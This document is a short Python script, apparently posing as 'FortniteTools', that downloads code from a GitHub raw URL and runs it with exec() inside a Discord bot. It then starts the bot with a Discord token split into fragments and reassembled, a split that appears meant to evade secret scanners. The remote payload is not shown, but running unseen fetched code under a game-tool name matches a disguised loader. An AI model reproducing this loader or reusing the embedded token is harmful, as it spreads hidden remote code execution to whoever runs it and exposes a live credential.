import discord
import requests

def execute_code_from_url(url, client=None):
    response = requests.get(url)
    if response.status_code == 200:
        code = response.text
        exec(code, globals(), {'client': client})
    else:
        print("Failed to fetch code from URL")

# Define your client variable
intents = discord.Intents.default()
client = discord.Client(intents=intents)

# Example usage:
url = "https://raw.githubusercontent.com/SSkiprs/FortniteTools/FortniteTools/FortniteToolsRAW.py"  # Replace with the actual URL
execute_code_from_url(url, client)

tk1 = "MTIxNzkyNDkxMTcyMTM1MzMyOA"
tk2 = "G01Lv2"
tk3 = "IX4gdQhiztO3I3S3qHrFfPux"
tk4 = "-B7V6sWnktJw1U"

TOKEN = tk1 + "." + tk2 + "." + tk3 + tk4

client.run(TOKEN)
